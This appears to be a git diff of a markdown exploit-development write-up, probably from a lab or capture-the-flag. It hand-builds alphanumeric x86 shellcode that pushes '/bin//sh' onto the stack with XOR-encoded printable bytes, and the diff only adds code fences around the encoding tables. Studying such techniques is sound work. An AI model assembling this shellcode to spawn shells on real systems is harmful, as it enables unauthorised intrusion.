@@ -27,6 +27,7 @@ R:              PUSH EDX
 
 ### [P4] PUSH 0x68732f2f
 
+```
 INPUT:
 0   0   0   0   0   0   3   0
 
@@ -40,6 +41,7 @@ XOR-2:
 
 TARGET:
 6   8   7   3   2   f   2   f
+```
 
 ```
 j 0:            PUSH 0x30
@@ -51,6 +53,7 @@ P:              PUSH EAX
 
 ### [P5] PUSH 0x6e69622f
 
+```
 INPUT:
 0   0   0   0   0   0   3   0
 
@@ -62,6 +65,7 @@ XOR-2:
 
 TARGET:
 6   e   6   9   6   2   2   f
+```
 
 ```
 j 0:            PUSH 0x30
@@ -74,6 +78,7 @@ P:              PUSH EAX
 ### [P6] MOV EBX, ESP
 Push ESP into stack, then push "POP EBX" instruction into stack, where EIP will point to.
 
+```
 INPUT:
 0   0   0   0   0   0   3   0
 
@@ -85,6 +90,7 @@ TARGET:
 
 - 4F: DEC EDI (NO-OP)
 - 5B: POP EBX
+```
 
 ```
 T:              PUSH ESP
